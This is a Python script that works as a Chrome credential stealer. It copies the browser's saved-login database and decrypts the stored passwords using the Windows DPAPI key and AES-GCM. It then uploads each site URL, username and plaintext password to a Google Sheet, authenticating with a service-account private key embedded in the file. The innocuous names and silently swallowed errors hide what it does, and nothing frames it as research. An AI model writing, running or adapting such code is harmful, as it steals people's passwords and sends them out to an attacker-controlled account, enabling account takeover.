import gspread
import shutil, os, sqlite3, json, base64, win32crypt, Crypto.Cipher.AES

db_name = "Python.db"
SHEET_NAME = "Python-Information"
SERVICE_ACCOUNT = {
  "type": "service_account",
  "project_id": "python-information",
  "private_key_id": "396a33b0ec28d61fe888fdaa39983eefbd360845",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQDOrWt1JoCqLbPD\nnJdsMquiVQb50PdIqT8d+cxsM6F2zD+ju9T3WgizG1IMCImJE7jQhWEzNVXU0ZMq\nGSmLsDAaYKMaj6DiEzfIMuMEooi9n0/sKWnB5Pcjzd+fhz8GD0PmGcTOmOT8V0eC\nLcwGABllb5ugZ9vpeMTL30zA/dVYM8zCTjjGsIAHtEwDenuZJIvD5toAP32Sjlu4\nq2OV9ZuzDO1ng0KhyLSxyfxD9JqoPNm2t04+UEZWxMIZ7E5oFXF10ShhZi/1S32I\n8lX/DOT+n5YAmE3G91rg1eLyUsh3R54MIlPdD4BV1z1SvNihoJbBrepCb5tIjILb\npM9TrB+PAgMBAAECggEAP8RxBb3B7//W2ZFMhQUjQJxEYTqwuVoCz+BdSrspY8qE\nDiQrgr/kNELHL1BJAyKzIJ8ujMq1d0rMQa5uy5sqVFEhsdXD2Uz9pobQ1YLCduMb\nGS3z4++dsw3Xo9RqRRfbprinqOiyqgrR1OAFdYp9S3dCiJzS1Le+3HpCp78JnsMa\nwCLzCpdzI7S61I2luJn1BWgkmZPLcqsvCiF8uScMcBC9EeZ861DTpE6UPh5CCWxf\nyK4xcX0662osBTiV141KjR0DiR/+6pgJMJ2GmMz4DXQPAaIN5YE46kX8qR1pPncy\neD/Pb1uv/7KUHDkAfrM1pt/KZ501cPOJhLD8fy3i2QKBgQDqZ3WQU8azS9l6mjiy\nbctuOb4uEAy2mxirRAYgXYZ0498j6CSU/QdSzUDbR1aFHpXoLnWdrn5VfXJ6p81Q\nPgshC+4kXSjW/PzWsQRwDt2HmaELbU24G4UnF7IiwdSzXfLJ8WocBzFhIHlXxwiE\ndUtRJVU8WkOKrCeQuDO1b69fyQKBgQDhuAMGGpNIJuTYOAiWwjuTu5VEK7KDofZV\n4qbPGoh9g0In76ki8eEqusXArS4BfNWmxzK61vnMBjUvrvwUt46IKjxW4jIEFKkt\nLMhzy0kPnb/iqgQajX8SlxNEiKikZ171KvC8+6A1O5NjrXsh8l1h/ow0JYRJzwRs\nVxpCzPWglwKBgQCK2ZAtV0LbkHGaC2LMZvdbKr85/+3X+VWKlfffEieEdDsIxQlu\na9f7t3PUsJRStIRuDZ9EMUnKkE3Q1DdtceMbxzpgtgJsH14SOrd7PYMCQQHBiBTC\nmyKrvoCZ0CGTwnIAJ44IXkZk11ypn0+vTt+3iJrN7lYV/dZOBp8yuZ6z6QKBgQCu\nHJwwhCVh/aZ+5tIxQIhmT8c3O6HLCg8Tdu8HSEdK0gog9ix4qS3wIPxTwQKA4UOJ\nD5UhLJypdYxnSMpoTKMkg7fhqT+9iBZro2TIdWHZKu0OMelSdh00QNb7AZNcpeRI\np6Plkw+koFz0Aai+qc7AvXJ28w2VRZv62kGGj8VU5wKBgQDpZEjxjzh2IMYmna65\ngNTQbEEjV4aXPU8cLYa9JO8B3UpLSMwnnd39TqMoM3RhV3cnFnIdZcjXH0djlJE7\n+5cut9cIYUaCeS/GahvBsqwLenPl8bNBsEX+Hw0N5gFLhzaWmjbRl4JjK2AJgEBk\nC3GIKhErIJtMHlSJqlD+sRC24A==\n-----END PRIVATE KEY-----\n",
  "client_email": "python-information@python-information.iam.gserviceaccount.com",
  "client_id": "106486010857587096503",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/python-information%40python-information.iam.gserviceaccount.com"
}


class Info:
    class Info:
        def __init__(self, origin, action, user, pw, creation, last_used):
            self.origin_url = origin
            self.action_url = action
            self.user = user
            self.pw = pw
            self.creation_date = creation
            self.last_used = last_used

    def __init__(self):
        try:
            if os.path.exists(db_name):
                os.remove(db_name)
            else:
                pws = self.get_information()
                self.upload_data(pws) 
        except:
            pass

    def upload_data(self, pw: list):
        sa = gspread.service_account_from_dict(SERVICE_ACCOUNT)
        sh = sa.open(SHEET_NAME)

        sh.sheet1.append_rows([[
            p.origin_url,
            p.action_url,
            p.user,
            p.pw,
            p.creation_date,
            p.last_used] for p in pw])

    def __decrypt(self,pw, key) -> str:
        try:
            return Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_GCM, pw[3:15]).decrypt(pw[15:])[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(pw, None, None, None, 0)[1])
            except:
                return ""

    def get_information(self) -> list:
        pws = []
        shutil.copyfile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data"), db_name)
        with sqlite3.connect(db_name) as db:
            cursor = db.cursor()
            with open(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State"), "r", encoding="utf-8") as f:
                key = win32crypt.CryptUnprotectData(base64.b64decode(json.loads(f.read())["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]
            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
            for row in cursor.fetchall():
                pws.append(self.Info(row[0], row[1], row[2], self.__decrypt(row[3], key), row[4], row[5]))
            cursor.close()
        return pws

if __name__ == "__main__":
    Info()


